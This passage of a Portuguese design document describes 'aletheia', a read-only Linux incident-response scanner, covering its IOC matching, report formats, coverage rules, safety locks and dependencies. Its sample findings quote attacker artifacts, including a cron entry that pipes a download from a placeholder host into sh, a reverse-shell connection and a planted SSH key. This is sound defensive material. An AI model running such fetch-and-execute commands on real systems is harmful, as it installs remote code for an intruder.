keys:    ["AAAAB3NzaC1yc2EA... user@atacante"]
users:   [backup2]
```

```
não é feed de fornecedor    é o que ESTA investigação produziu (§5.4, §5.10, §23)
casamento é barato          os fatos já foram coletados; IOC só compara
severidade                  achado por IOC é CRITICAL: não é heurística, é o artefato
                            confirmado deste incidente aparecendo em outro host
origin                      native — casamento contra dado já lido
```

O formato acima é o que a ferramenta lê, e ela **não traz um parser de YAML**:
uma biblioteca custaria a primeira dependência do projeto para ganhar o parse de
seis chaves com listas de string. O leitor aceita as três formas que uma lista de
incidente tem na vida real, e o que ele não entende ele **imprime**:

```
formas aceitas   `ips: [a, b]` · bloco com `- item` · um indicador por linha,
                 classificado pela FORMA quando o tipo não vem dito
não entendido    chave desconhecida e linha que não classifica viram AVISO no
                 relatório e cobertura PARCIAL no check — nunca silêncio
lista vazia      erro de invocação (exit 3): uma varredura que segue limpa com
                 uma lista que ninguém entendeu é a pior saída possível
hash             comparado contra os arquivos que a varredura examinou, em ordem
                 de prioridade (o que roda antes do inventário de módulos), com
                 orçamento declarado quando corta
chave            casa por IMPRESSÃO DIGITAL, não por texto: a mesma chave aparece
                 com outras opções e outro comentário
```

> É o que transforma a §23 de "rode o mesmo comando em N hosts" em "responda se **este** comprometimento está em N hosts".

### 6.5. `--since` — a janela de investigação

Parâmetro **transversal**: aplica-se à timeline por `ctime`, à busca de arquivos recentes, à leitura de log e à janela de correlação. Sem ele, cada check inventa a própria janela e os resultados não se cruzam.

```bash
aletheia scan --since 2026-04-30T18:00Z
aletheia scan --since 72h
```

**Resolve um ovo-e-galinha da §9.** A timeline precisa de um âncora, e na primeira execução não existe achado de onde derivá-lo. A regra:

```
--since informado        usa a janela dada, em tudo
--since ausente, com
  achado datável         deriva o âncora do ctime do artefato mais suspeito, e DIZ que derivou
--since ausente, sem
  achado                 usa os últimos 7 dias e DIZ que usou — não finge ter derivado
```

### 6.6. Frota

```bash
for h in $(cat hosts.txt); do
  ssh "$h" 'sudo /root/ir/aletheia scan --json -' > "out/$h.jsonl"
done
jq -s 'group_by(.id) | map({id:.[0].id, hosts:[.[].host]})' out/*.jsonl
```

Mesmo `id` em N hosts = comprometimento de frota, não incidente isolado (§23).

---

## 7. Saída

| Formato | Uso |
|---|---|
| **relatório humano** | quem está no terminal agora |
| **JSONL** | máquina: agregação de frota (§23), diff entre execuções, ticket |
| **checklist** | só as findings `MANUAL` — tarefas para depois de sair do terminal |
| **`facts.json`** | evidência bruta redigida (ver 5.4): analisar do lado limpo · fixture de teste |
| **run log** | auditoria da própria ferramenta: qual execução, qual binário, qual cobertura |

### 7.1. Níveis de exibição

O que o operador precisa **para decidir** é diferente do que ele precisa **enquanto investiga**. Decisão é: o host está comprometido, qual a coisa mais urgente, onde focar. `ppid`, `cgroup`, hora de início e evidência bruta são para depois — quando ele já escolheu um achado.

```
default      uma linha por GRUPO de achado + bloco de ação + cobertura em 1 linha
-v           evidência completa por achado (ver 7.3)
-vv          + INFO + detalhe de cobertura parcial por check + tempo de cada check
--checklist  só os MANUAL, como lista de tarefas
--json       SEMPRE completo, independente do nível de exibição
```

> **O JSONL nunca é afetado pela verbosidade.** Compactação é decisão de **exibição**, não perda de dado — senão a agregação de frota (§23) passaria a depender de qual flag o operador usou.

O que mais economiza linha é **agrupar por `ID`**, que já é como o modelo funciona (N findings, mesmo `ID`, `Subject` distinto): `8× exe em local suspeito` no lugar de oito linhas.

### 7.2. Default — o formato de decisão

```
web-01 · 4.19.0-21 · up 47d · load 8.02 (2 cpu) ⚠ · relógio ok · 2026-08-16T21:44:03Z
⛔ 2   ⚠ 6   ◆ 4 manuais   ·   cobertura 39/47

⛔ pid 6574   revshell: fd 0,1,2 → 51.91.190.241:443 · exe ~/.config (deleted)   §17
⛔ /etc/ld.so.preload existe · rootkit de userland · achados via dpkg rebaixados §7.8
⚠  pid 3311   pivô: socket externo + interno no mesmo processo                  §12.2
⚠  8×         exe em local suspeito (node, python3, …)                          §8
⚠  /etc/cron.d/certbot-renew   */7 * * * * curl … | sh                          §7.1
⚠  /usr/bin/ss   checksum difere ⚠rebaixado                                     §24

AGORA, nesta ordem (§19 — não inverta):
  1. aletheia preserve --pid 6574 --out $IR        ← irreversível se pulado
  2. isolar na REDE, não no host (§18)
  3. remover persistência antes de matar

não verificado: eBPF (bpftool ausente) · ftrace (debugfs) · §2.7 · §16
◆ 4 manuais pendentes → aletheia scan --checklist        detalhe por achado → -v
```

~18 linhas, **independente do tamanho do incidente**. Três regras que sustentam isso:

```
load com nº de CPUs      "load 8.02" é catastrófico em 2 cpu e normal em 16. Sem o contexto
                         o ⚠ é ruído — e minerador é o caso nº 1 em VM de nuvem
bloco AGORA adapta       com crítico: a ordem da §19. Só com aviso: "revise antes de agir".
                         Sem nada: some, e no lugar entra o aviso de que 39/47 ≠ host limpo
ordem por URGÊNCIA       um `preserve` pendente vem antes de tudo, por ser o único passo
                         irreversível se pulado. Crítico sem ação imediata vem depois
```

> **`wtf` não é "scan compacto".** A densidade de exibição fica parecida; o que muda é a **cobertura** — 11 checks em 0.4s contra 47. Não funda os dois.

### 7.3. `-v` — o formato de investigação

```
aletheia 0.2+a1b2c3f · scan · live
host      web-01 · 4.19.0-21-amd64 · debian 10 · kvm · up 47d
tempo     2026-08-16T21:44:03Z (UTC) · relógio sincronizado (offset 0.003s)
escopo    47 checks · 312 processos · 15 conexões · 8 units habilitadas

════ CRITICAL ══════════════════════════════════════════════════════════

⛔ proc.revshell_fd_socket                                     §17   native
   pid=6574
   exe     /home/node/.config/htop/defunct  (deleted)
   ppid    1 · user node · início 2026-04-30T18:31:02Z (108d)
   fd      0,1,2 → socket:[8891234]  ·  /dev/pts/3
   peer    51.91.190.241:443
   cgroup  /system.slice/  — nenhuma unit corresponde
   → NÃO mate antes de preservar: o binário só existe neste processo (§6, §3.16)
     aletheia preserve --pid 6574 --out $IR

⛔ persist.ld_preload_global                                   §7.8  native
   path=/etc/ld.so.preload
   conteúdo  /usr/lib/libselinux.so.3
   ctime     2026-04-30T18:33:11Z · não pertence a nenhum pacote
   → rootkit de userland. TODO achado com origin:tool desta execução fica
     rebaixado — o binário do host pode estar mentindo (ver 7.5)

════ WARNING ═══════════════════════════════════════════════════════════

⚠  net.pivot_dual_socket                                      §12.2  native
   pid=3311 node
   saída externa   10.0.0.5:51204 → 51.91.190.241:443      (iniciada por este PID)
   saída interna   10.0.0.5:44120 → 10.0.0.9:22 · 10.0.0.11:3306
   → este host é caminho, não só alvo. Alcance interno: §12.4
   FP descartado: nenhuma conexão de ENTRADA externa — não é proxy

⚠  persist.cron_short_interval                                §7.1   native
   path=/etc/cron.d/certbot-renew
   */7 * * * * root curl -s http://185.x.x.x/i | sh
   → intervalo de 7 min. Compare com o delta do beacon (§2.7)

⚠  integrity.pkg_mismatch                            §24  origin:tool:dpkg ⚠rebaixado
   path=/usr/bin/ss  (checksum '5' difere, arquivo não-config)
   → confiança reduzida: ld.so.preload presente acima

════ MANUAL — o host não responde isto ═════════════════════════════════

◆ exfil.volume                                                §37.2
  âncora desta execução  2026-04-30T18:20Z ± 2h  (ctime de pid 6574)
  instância              web-01
  → métricas: bytes enviados por instância, agrupado por nome
  → compare enviado × recebido na janela — assimetria é o sinal (§37.2)
  → audit administrativo do plano de controle: sempre ligado, ~1 ano (§10.4)

◆ cloud.credential_reach                                      §34.4
  → "se o token desta instância vazar agora, o que ele abre?"
  → e o que ele consegue DELETAR (§34.11) — cheque ANTES de conter

════ COBERTURA ════════════════════════════════════════════════════════

verificados      39/47
parciais          4   §7 sem /root · §12 sem btmp · §24 base parcial · §36 sem /root
não verificados   4   §35.3 debugfs não montado
                      §35.4 bpftool ausente — eBPF NÃO foi verificado
                      §2.7  requer --sample-duration
                      §16   requer --app-root

RESULT: CRITICAL          2 críticos · 6 avisos · 4 manuais · cobertura 39/47

ordem sugerida (§19 — não inverta):
  1. aletheia preserve --pid 6574 --out $IR
  2. isolar na camada de REDE, não no host (§18)
  3. remover persistência ANTES de matar (§19)
```

### 7.4. JSONL

```jsonl
{"host":"web-01","ts":"2026-08-16T21:44:03Z","tool":"aletheia/0.2+a1b2c3f","mode":"live",
 "id":"proc.revshell_fd_socket","ref":"17","sev":"CRITICAL","origin":"native",
 "subject":"pid=6574","actor":"/usr/local/sbin/systemd-netlinkd",
 "title":"fd 0,1,2 no mesmo socket",
 "evidence":["exe=/home/node/.config/htop/defunct (deleted)","peer=51.91.190.241:443"],
 "next_steps":["aletheia preserve --pid 6574 --out $IR"]}
{"host":"web-01","ts":"...","id":"coverage","checked":39,"total":47,
 "not_checked":[{"ref":"35.4","reason":"bpftool ausente"}]}
```

> **A cobertura vai no JSONL também.** Sem essa linha, a agregação de frota mostra "web-02 sem achados" escondendo que lá metade dos checks não rodou — que é precisamente o erro que a ferramenta existe para não cometer.

**`actor`** é o binário por trás do `subject`, quando o sujeito não é ele: o `exe` de um pid, o alvo do `ExecStart` de uma unit. Sai ausente na maioria dos achados, e existe porque um invasor competente dispara checks cujos sujeitos são de tipos diferentes — um caminho, um pid, um nome de unit — apontando para o mesmo implante. Com o campo, a agregação de frota consegue perguntar "quantos hosts têm sinal neste binário" sem reconstruir a tradução em cada consumidor.

> Ele é preenchido pelo MOTOR, não pelo check, e só quando algum outro achado da mesma execução já nomeia aquele caminho como sujeito próprio. Sem essa condição, todo processo de um interpretador compartilhado viraria o mesmo ator.

### 7.5. Rebaixamento de confiança

Achado que invalida a confiança em binário do host **rebaixa retroativamente** todos os findings com `origin:tool:*` da mesma execução.

```
gatilho                          efeito
/etc/ld.so.preload existe        §7.8 — todo origin:tool:* vira "⚠rebaixado"
LD_PRELOAD no environ de PID     idem, e a evidência aponta o PID
binário de sistema adulterado    §24 — se o próprio dpkg/rpm estiver na lista, o
                                 rebaixamento é total e vira CRITICAL
```

É propriedade emergente de ter `Origin` no modelo: o relatório passa a distinguir o que a ferramenta **leu** do que ela **perguntou a um binário que pode mentir**.

### 7.6. `aletheia checks` — o catálogo

Lista todos os checks com `id`, `§ref`, modo, grupo e `Requires`. Serve para três coisas que hoje exigiriam ler o código: saber a cobertura **antes** de rodar, montar o comando de frota com o escopo certo, e auditar a ferramenta.

```
ID                          §REF   MODO    GRUPO     REQUIRES  FALSOS POSITIVOS
proc.revshell_fd_socket     17     auto    proc      procfs    socket activation
proc.memfd_exec             3.16   auto    proc      procfs    runtime com JIT via memfd
net.pivot_dual_socket       12.2   auto    net       procfs    (nenhum: exige SAÍDA nos dois)
kernel.ebpf_orphan          35.4   auto    kernel    bpf       tracing legítimo carregado
exfil.volume                37.2   manual  cloud     —         —
```

A coluna de falso positivo não é decoração: é o que o operador lê **antes** de decidir se vale investigar aquele achado.

### 7.7. O rastro da própria ferramenta

A seção 10 exige registrar caminho, hora e hash do binário no war log (§39.3) **antes** de rodar — mas quem registra é o humano, e é o tipo de passo que se pula. O binário sabe o próprio caminho e o próprio hash: ele imprime a linha pronta para colar.

```
WAR LOG (§39.3) — cole antes de prosseguir:
2026-08-16T21:44:03Z  lex  FERRAMENTA  /root/ir/aletheia scan
                                       sha256=a1b2c3f… versão 0.3
```

Fecha o ciclo do aviso de que **a ferramenta vira artefato** na timeline da §9: o arquivo que você acabou de copiar tem `ctime` de agora e é um ELF estático fora de pacote.

#### Run log — o que a ferramenta registra sozinha

Havendo `--out` ou `--history`, cada execução **anexa** uma entrada em `$IR/aletheia-runs.jsonl`. É auditoria da própria ferramenta, e ela é a única que tem o dado:

```jsonl
{"ts":"2026-08-16T21:44:03Z","host":"web-01","cmd":"scan --ioc incidente.yaml",
 "tool":"aletheia/0.3","sha256":"a1b2c3f…","path":"/root/ir/aletheia",
 "duration_ms":1840,"coverage":{"completos":41,"parciais":2,"nao_verificados":4},
 "findings":{"critical":2,"warn":6,"manual":4}}
{"ts":"2026-08-16T21:52:10Z","host":"web-01","cmd":"preserve --pid 6574",
 "artifacts":[{"src":"/proc/6574/exe","dst":"$IR/samples/pid-6574.bin",
               "sha256_original":"9f2c…","sha256_copia":"9f2c…"}]}
```

Resolve um problema concreto: depois de três dias de incidente e 40 execuções em 12 hosts, *"qual execução produziu este achado, com qual binário, sob qual cobertura?"* só tem resposta se alguém registrou. E a linha do `preserve` **é** a cadeia de custódia da §6.

> **Sem `--out`, `scan` não escreve nada** — nem run log. O caso padrão continua sendo saída para o terminal e mais nada (ver princípio 6).

#### Run log ≠ war log

```
run log   $IR/aletheia-runs.jsonl · escrito pela FERRAMENTA · só com --out/--history
          o que a ferramenta fez: quando, com qual binário, cobertura, o que preservou

war log   humano · vive FORA do host (§39.2)
          o que as PESSOAS fizeram e decidiram, e quem autorizou
          a ferramenta contribui com UMA LINHA (acima), nunca com o arquivo
```

A ferramenta não tem como escrever o war log, por dois motivos independentes:

```
conteúdo   "ana DECIDIU manter o serviço no ar (autorizou: <nome>)" está fora do alcance
           de qualquer ferramenta — é decisão, autorização e ação manual (§39.3)
lugar      o war log deve viver FORA da caixa (§39.2 — o atacante pode estar lendo o canal).
           A ferramenta escreve localmente, no host comprometido. Manter o war log ali seria
           pôr o registro do incidente exatamente onde ele não deve estar
```

### 7.8. O que a CLI deliberadamente NÃO entrega

```
veredito de host limpo    nunca. O máximo é "nenhum indicador coberto disparou"
score de risco            número agregado esconde a diferença entre 1 crítico e 8 avisos
remediação                §18–§21 é decisão humana; automatizar destrói evidência
atribuição                quem é o atacante não é pergunta que o host responde
```

---

**Tempo é sempre UTC.** O runbook é explícito (§9, §10.4, §39.3), e a nuvem loga em UTC — misturar fuso arruína a correlação da §9.1. O cabeçalho registra também o **estado de sincronização do relógio do host**: se o NTP não está sincronizado, todo achado datado desta execução é frágil, e isso precisa estar escrito no relatório, não descoberto depois.

O cabeçalho registra **versão + hash do binário** — o war log (§39.3) passa a saber exatamente qual ferramenta produziu cada achado.

### 7.9. Cobertura e exit code

**O denominador é o conjunto selecionado para aquela execução**, não o catálogo inteiro. `scan` = 47/47; `wtf` = 11/11; `scan --only proc` = 12/12. O cabeçalho declara qual conjunto foi usado. Sem essa regra, `wtf` e `--only` sairiam sempre INCOMPLETE e o exit code deixaria de significar algo.

O rodapé sempre imprime o que **não** foi verificado e por quê:

```
COBERTURA   completos 41 · parciais 2 · não verificados 4 · total 47
  parciais         §7 sem /root · §24 sem base de pacotes
  não verificados  sem root: 2 · debugfs ausente: 1 · bpftool ausente: 1

RESULT: INCOMPLETE — 0 achados, mas 6 checks não cobriram o que deveriam.
                     Isto NÃO é o mesmo que host limpo (§35.8).
```

`completos + parciais + não verificados = total`. Parcial conta como **não completo**: um check que rodou sem `/root` não cobriu o que deveria, e isso pesa no `RESULT`.

```
0  OK          zero achados E cobertura completa
1  WARNING     achado que precisa de olhar humano, OU cobertura incompleta sem achado
2  CRITICAL    indicador de alta confiança
3  ERROR       argumento ou ambiente inválido
```

Exit `0` exige as duas condições. Uma execução sem root, sem debugfs e sem `bpftool` **não** sai zero — seria a ferramenta contradizendo o próprio nome.

Por subcomando:

```
scan · wtf     como acima
readiness      0 só com telemetria COMPLETA. Faltar auditd, log off-box ou retenção
               suficiente é o achado — sair 0 ali seria negar o propósito do comando
diff           0 sem deriva; 1 com deriva; 2 se a deriva incluir item de alta severidade
               (SUID novo, conta UID 0 nova, unit habilitada nova)
watch          0 se nada apareceu; 1 se apareceu processo/conexão nova; 2 se algum
               achado decisivo (ver 6.1) surgiu durante a janela
collect        0 se o facts.json foi escrito íntegro; 3 em erro de escrita
preserve       0 se todo artefato pedido foi copiado e conferido por hash; 1 se algum
               falhou (processo morreu no meio, permissão) — nunca silencioso;
               2 se o hash da ORIGEM e o da CÓPIA divergiram, que não é erro de
               cópia e sim o artefato tendo mudado durante a leitura
```

---

## 8. Mapa de cobertura

Automatizável (`A`), manual parametrizado (`M`), fora de escopo (`—`).
Seções conceituais — doutrina sem check possível — aparecem como `—` com o motivo.

| § | Assunto | | Observação |
|---|---|:-:|---|
| 0 | Telemetria / prontidão | A | `readiness`: auditd, retenção de log, agente, NTP, baseline |
| 1 | Preparação | M | snapshot é ação de nuvem |
| 2 | Rede | A | sockets, listeners, saída para IP público |
| 2.6 | Captura de tráfego | A | `preserve --pcap` — AF_PACKET nativo, com o aviso da §35.4 |
| 2.7 | Beacon intermitente | A | `watch --duration` — delta, periodicidade e casamento com gatilho |
| 3 | Processo | **A** | passada única em `/proc` — maior sinal por segundo |
| 3.15 | Namespaces | A | inode vs PID 1, sem cgroup de container |
| 3.16 | Fileless / memfd | **A** | `exe` → `/memfd:` ou `(deleted)` |
| 4 | Checklist de processo | A | é o próprio relatório |
| 5 | Arquivo / binário | A | stat, hash, tipo, ELF — só para arquivos já sinalizados |
| 5.9 | Nunca executar suspeito | — | conceitual: é trava da ferramenta (ver 10), não check |
| 5.10 | Família da ferramenta | M | pesquisa externa |
| 6 | Preservar | A | `preserve` — o que preservar continua sendo decisão do operador |
| 7 | **Persistência** | **A** | ~25 checks — a maior economia de tempo manual |
| 8 | Arquivos suspeitos | A | caminhada com orçamento |
| 9 | Timeline | A | janela por `ctime`; deriva âncora |
| 9.1 | Correlação | A/M | deriva âncora automaticamente; cruzamento é manual |
| 10 | Logs | A/M | retenção local automática; nuvem é manual |
| 10.4/10.5 | Nuvem / metadata | M | parametrizado com instância e janela |
| 11 | Auditd | A | ativo? quais regras? |
| 12 | Login / lateral | A | wtmp/btmp, chaves, known_hosts, socket de agente |
| 12.2 | Pivô | **A** | correlação socket externo + interno no mesmo PID |
| 13 | Bash history | A | ausente, symlink p/ /dev/null, HISTFILE desativado, padrões |
| — | Anti-forense | **A** | família própria (ver 5.7): wtmp, log zerado, chattr, timestomp |
| 14 | Serviço vulnerável | A | listener → processo → usuário |
| 15 | Reverse proxy | A | leitura de config, backend exposto |
| 16 | Camada de aplicação | A | sinks, webshell, integridade git, `.gitignore` |
| 17 | Indicadores de reverse shell | A | correlação (ver 5.8) |
| 18–21 | Contenção / remoção | — | **nunca automatizar** |
| 22 | Validar após limpeza | A | `--history`: compara com a execução anterior |
| 23 | Frota | A | agregação de JSONL por `id` |
| 24 | Integridade de pacote | A | `origin: tool:dpkg` |
| 25 | Capabilities / SUID | A | |
| 26 | Rotação de credenciais | M | |
| 27 | Rebuild | M | inclui verificação de origem da imagem |
| 28–30 | Coleta | A | `collect` (fatos) + `preserve` (amostras) |
| 31 | Red flags | A | é o mapeamento de severidade — e o conteúdo do `wtf` (ver 6.1) |
| 32 | Ferramentas | A | quais existem no host (info) |
| 33 | Regra principal | — | conceitual: é a ordem do relatório, não um check |
| 34 | Hardening / blast radius | A/M | auditoria local automática; nuvem manual |
| 34.11 | Backup como alvo | M | alcance da credencial é pergunta de nuvem |
| 35 | Kernel | **A** | taint, módulos, ftrace, kprobes, eBPF, divergência |
| 36 | Privesc | A | SUID, caps, sudoers, grupos, gravável-executado-por-root |
| 37 | Exfiltração | A/M | staging e ferramentas locais automáticos; volume é manual |
| 38 | Contêiner / k8s / mesh | A/M | docker automático; k8s e mesh manuais |
| 39 | Gestão do incidente | M | integralmente humano |
| 40 | Rotina | A | `baseline` e `diff` |

---

## 9. Portabilidade

```
piso              kernel ≥ 2.6.32 (RHEL/CentOS 6+). RHEL 5 fica com o script shell
arquiteturas      amd64, arm64, 386
libc              nenhuma — CGO_ENABLED=0. glibc/musl deixa de ser questão
distro            NUNCA ramificar por nome. Sondar caminho/serviço existente
```

Variabilidade real a sondar:

```
cron spool     /var/spool/cron | /var/spool/cron/crontabs | /etc/cron/crontabs
units          /usr/lib/systemd | /lib/systemd
auth log       /var/log/secure | /var/log/auth.log
pacote         rpm | dpkg | apk | pacman
init           systemd | sysvinit | upstart | openrc
cgroup         v1 "N:ctrl:/path" | v2 "0::/path"
tracing        /sys/kernel/debug/tracing | /sys/kernel/tracing
```

### Armadilhas de parsing (falso negativo silencioso)

```
/proc/pid/stat     comm contém espaço E parêntese — parseie a partir do ÚLTIMO ')'
/proc/pid/status   conjunto de campos varia por kernel — parseie por CHAVE, tolere ausência
/proc/net/tcp      mapear inode→pid exige varrer /proc/*/fd: caro. Orçamento + NOT_CHECKED
/proc/pid/ns       pode não existir em kernel antigo → NOT_CHECKED, não "sem anomalia"
os/user sem cgo    lê /etc/passwd direto, sem NSS: conta de LDAP/SSSD não aparece.
                   Precisa constar no relatório, senão "0 contas com shell" engana
```

**Regra:** campo ausente nunca vira valor zero. Vira desconhecido, e o check que dependia dele reporta não-verificado.

---

## 10. Travas de segurança

```
read-only por construção   nada altera o estado do host. Escrita só em --out; só `preserve`
                           copia artefato DO HOST, e apenas no alvo explícito
sem rede                   sem net/http; dialer bloqueado. Consulta DNS avisa o atacante (§2.1)
sem execução do host       nunca executa binário encontrado no alvo (§5.9)
allowlist de ferramentas   só rpm/dpkg, marcados como origin: tool:*
orçamento                  máx. arquivos, máx. duração por check, teto de memória
                           limite atingido = NOT_CHECKED, nunca truncamento silencioso
redação                    ver 5.4 — segredo não sai do host por descuido
auto-identificação         marcador embutido: o scanner ignora a si mesmo e a outros
                           detectores que carreguem o marcador
```

> **A ferramenta vira artefato.** O binário copiado para o host tem `ctime` de agora e aparece na busca da §9 — e é um ELF estático, stripped, fora de pacote: exatamente o perfil que a §5.3 e a §24 mandam tratar como suspeito. Registre caminho, hora e hash no war log (§39.3) **antes** de rodar. E nunca execute via `memfd`: seria a técnica da §3.16, e a ferramenta apareceria como implante fileless na varredura seguinte.

---

## 11. Dependências

### 11.1. Política

```
1. stdlib primeiro, sempre
2. exceções aprovadas, com justificativa registrada em 11.4:
     golang.org/x/sys/unix   syscalls e constantes por arquitetura
     golang.org/x/net/bpf    assembly de filtro BPF para o preserve --pcap
3. qualquer outra exige justificativa ESCRITA aqui: o que faz, por que não dá para fazer
   nativo, e quem auditou
4. tudo vendorizado — `go mod vendor`, `vendor/` commitado
5. release compilado em container limpo, com go.sum verificado
```

> Ambas as exceções são repositórios do time do Go — mesmo nível de confiança da stdlib, e o critério para uma terceira deve ser igualmente alto.

**O argumento não é tamanho de binário — é cadeia de suprimentos.** O valor inteiro desta ferramenta é ser confiável. Cada dependência é código não auditado rodando **como root, num host sob investigação**. Se a ferramenta estiver errada, todo achado está errado e não há como saber.

O item 4 sustenta a cadeia de custódia: com `vendor/` no repositório, o build é reproduzível e é possível **provar** o que estava dentro do binário que produziu um laudo — mesma lógica do `-trimpath` e do hash no cabeçalho do relatório (ver 7).

### 11.2. Sem framework de CLI

Nada de Cobra. Para 8 subcomandos, `flag` da stdlib mais um `switch` são ~80 linhas, contra ~10k de Cobra + `spf13/pflag`.

Há um motivo prático além do princípio: o bloco de `--help` é **documentação** da ferramenta — no modelo do `scan-gsocket.sh`, com QUICK START, MODES, EXIT CODES e LIMITS em prosa. Um framework impõe formatação própria e brigaria com isso.

### 11.3. O que a stdlib já cobre

```
flag             CLI e subcomandos
encoding/json    facts.json e JSONL
crypto/sha256    cadeia de custódia (§6)
debug/elf        header, seções, DT_NEEDED, RUNPATH, símbolos — a §5.6 inteira,
                 sem dependência e sem chamar readelf do host
os, io/fs        /proc, /sys, caminhada com orçamento
time             UTC em tudo
testing          suíte sobre fixtures
```

### 11.4. Decisões registradas

**eBPF — implementar nativo, sem `cilium/ebpf`.**
A biblioteca é um loader/gerenciador completo; o que se precisa aqui é apenas *enumeração*: `BPF_PROG_GET_NEXT_ID`, `BPF_PROG_GET_FD_BY_ID`, `BPF_OBJ_GET_INFO_BY_FD`. São ~250 linhas sobre `unix.SYS_BPF` e removem a maior dependência do projeto.

**Netlink — adiar, não adotar.**
Parsing de mensagem netlink é chato o bastante para tentar uma lib (`mdlayher/netlink` seria a escolha). A sequência certa evita pagar essa complexidade cedo:

```
v1  só /proc/net/tcp{,6}    zero dependência, funciona em kernel antigo, cobre a §2 inteira
v2  + netlink nativo        acrescenta a divergência da §35.5 — que é BÔNUS, não núcleo
```

Enquanto o netlink não existir, `CapNetlink` fica ausente e a divergência aparece como `NOT_CHECKED` — coerente com o princípio 2.

**`watch` — zero dependência nova.**
Polling de `/proc` e da tabela de socket em intervalo, diff entre snapshots, cálculo de delta. Tudo stdlib, reusando `facts/proc` e `facts/net`.

A limitação é processo de vida curtíssima, que polling perde. A evolução, se o v1 provar insuficiente:

```
v1  polling                  zero dep. Perde processo curtíssimo — e o rodapé DIZ isso
v2  netlink proc connector   CN_IDX_PROC: o kernel EMPURRA fork/exec/exit (é o que o
                             forkstat usa). ~150 linhas, exige CAP_NET_ADMIN
—   eBPF                     melhor, mas é toolchain inteira. Fora de escopo aqui
```

**`preserve --pcap` — a exceção NÃO foi usada.** Ver o registro em TASKS.md: o
filtro ficou em espaço de usuário, e com isso a política de zero dependências
seguiu intacta. O texto abaixo é o que se planejava.


O que fica **nativo**:

```
socket        unix.Socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL)) + bind — ~50 linhas
escritor pcap 24 bytes de header global + 16 por pacote + os bytes — ~40 linhas
```

> **Armadilha do linktype:** bind em `any` faz o kernel entregar cabeçalho *cooked*, e o linktype vira `LINKTYPE_LINUX_SLL` (113), não `ETHERNET` (1). Errar isso produz um `.pcap` que o Wireshark não abre.

O que justifica a dependência: o **filtro BPF**. Sem `SO_ATTACH_FILTER`, todo pacote é copiado para userspace. E encodar as instruções à mão tem os offsets `jt`/`jf` — exatamente a classe de bug silencioso que a seção 9 diz querer evitar. `x/net/bpf` é repositório do time do Go, mesmo nível do `x/sys`, e dá `bpf.Instruction` tipado com `bpf.Assemble()`.

```
o filtro continua sendo NOSSO — a lib só encoda
verificação independente: derive cada formato com `tcpdump -dd 'host 1.2.3.4'` e
compare com o que o assembler produz
```

> **Não aceitar expressão de filtro arbitrária.** Compilar `"tcp[13] & 2 != 0"` exigiria o compilador da libpcap, que é cgo — e cgo mata o binário estático (seção 4). Quatro formatos fixos (`--host`, `--port`, ambos, `not port 22`) cobrem o uso em IR.

**Perda de pacote precisa ser reportada.** `read()` simples perde sob carga alta; o ring mmap (TPACKET_V3) resolveria, mas são ~400 linhas e muito mais superfície de erro. Comece com `read()` — e leia `PACKET_STATISTICS`:

```go
getsockopt(fd, SOL_PACKET, PACKET_STATISTICS)  // → tp_packets, tp_drops
```

Uma captura que perdeu 40% dos pacotes e não avisa é o truncamento silencioso que a ferramenta existe para não cometer — mesma regra do teto de arquivos virando `NOT_CHECKED` (5.5).

**Dump de memória — nativo, sem `gcore`.**
Ler `/proc/<pid>/maps` + `/proc/<pid>/mem` são ~100 linhas de stdlib, sem dependência. E não é só economia: `gcore` faz `PTRACE_ATTACH`, o que **seta `TracerPid`** — indicador que a própria ferramenta reporta (§3.7) — e para o processo. A leitura direta como root não faz attach. Detalhe em 6.3.

ELF core carregável no gdb fica **fora de escopo**: exigiria estado de registradores via ptrace, e a análise que precisaria disso usa dump de sistema inteiro (§35.6).

**Rejeitados:**

```
google/gopacket    enorme, e o backend de captura é libpcap via cgo
mdlayher/packet    pure-Go e bom, mas o setup do socket são ~50 linhas: vale possuir
qualquer libpcap   cgo
```

---

## 12. Layout

```
cmd/aletheia/main.go
internal/env/        probe de capacidade, modo live|image, resolução de caminhos, relógio
internal/facts/      proc.go net.go systemd.go users.go kernel.go mounts.go pkg.go redact.go
internal/check/      Check, Finding, Result, Severity, registry, engine, coverage
internal/checks/     s02_net.go s03_proc.go s07_persist.go s24_integrity.go
                     s35_kernel.go s36_privesc.go s37_exfil.go correlate.go
internal/report/     human.go jsonl.go checklist.go coverage.go
internal/budget/     limites de tempo, arquivos, memória
testdata/fixtures/   facts.json capturados de distros reais (redigidos)
```

Registro por `init()` no pacote `checks` — acrescentar um check é criar um arquivo, sem fiação manual.

---

## 13. Testes

A separação fatos/checks é o que torna isto possível:

```bash
aletheia collect --out testdata/fixtures/rhel6.json
aletheia collect --out testdata/fixtures/ubuntu22.json
aletheia collect --out testdata/fixtures/alpine.json
```

A suíte roda todo check contra todas as fixtures, **sem root e sem host infectado**. É o que separa "deve funcionar em qualquer distro" de "funciona": corpus, não esperança.

Cada host tocado durante um incidente real gera uma fixture de graça — desde que redigida (ver 5.4). O CI recusa fixture com valor de variável fora da allowlist.

---

## 14. Build

```bash
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -trimpath -ldflags="-s -w -X main.version=$V"
CGO_ENABLED=0 GOOS=linux GOARCH=arm64 go build -trimpath ...
CGO_ENABLED=0 GOOS=linux GOARCH=386   go build -trimpath ...

file dist/aletheia-amd64      # DEVE dizer "statically linked" (§5.3)
ldd  dist/aletheia-amd64      # "not a dynamic executable"
readelf -d dist/aletheia-amd64 | grep NEEDED    # nenhuma
```

`-trimpath` dá build reproduzível — o hash do binário vira parte da cadeia de custódia.

---

## 15. Ordem de implementação

```
1. env + facts/proc + engine + report + cobertura    esqueleto rodando, padrão estabelecido
2. checks §3 / §4 / §3.16 + correlate §17            maior sinal por segundo
2b. `wtf`                                            sai quase de graça depois do passo 2:
                                                     é o mesmo loop de /proc com outra
                                                     renderização e orçamento apertado
3. facts/net + checks §2 / §12.2                     pivô e correlações
4. checks §7 persistência                            maior economia de tempo manual
5. checks §24 / §25 / §36                            integridade e privilégio
6. checks §35 kernel                                 eBPF nativo via cilium/ebpf
7. checks MANUAL (§37, §10.4, §39, §34)              completa a cobertura do runbook
4b. --ioc + --since                                  o que fecha a §23 de verdade, e resolve
                                                     o âncora da §9. Barato: os fatos já existem
4c. família anti-forense + `aletheia checks`         leitura de arquivo único, alto sinal
7b. `watch`                                          reusa facts/proc e facts/net; só muda
                                                     a amostragem no tempo e a renderização
8. collect/analyze split + fixtures + redação        é aqui que vira reutilizável
9. preserve (+ dump de memória + --pcap)             depois que scan já aponta corretamente
10. baseline / diff / readiness                      vira rotina (§40.1)
```

---

## 16. Questões em aberto

```
licença                      ?
repositório público?         se sim, as fixtures precisam de redação auditada antes do push
